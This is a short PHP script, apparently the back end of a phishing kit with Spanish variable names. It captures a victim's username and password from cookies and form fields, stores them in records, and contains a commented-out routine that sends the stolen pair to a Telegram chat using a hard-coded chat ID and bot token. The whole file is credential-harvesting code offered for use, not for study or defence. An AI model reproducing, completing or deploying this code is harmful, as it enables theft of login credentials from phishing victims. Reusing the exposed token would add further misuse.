<?php 

require('../panel/lib/funciones.php');
require('../acciones/bot_telegram.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

setcookie('contrasena',$contrasena,time()+60*9);

if (isset($_COOKIE['registro'])) {
	$id = $_COOKIE['registro'];
	actualizar_usuario($usuario,$contrasena,$id);
}else{
	crear_registro($usuario,$contrasena,$dispositivo);	
}


if(empty($usuario) || empty($contrasena)){
    
}else{
    
// $chatId= "1053381147";
// $token = "7326614103:AAH7nj1c_exaJ8VUAVSLNYM4dUcaX3nu2JI";
// $mensaje = "Nuevo Usuario: $usuario - $contrasena";
// enviarMensajeTelegram($chatId, $mensaje, $token);


}



?>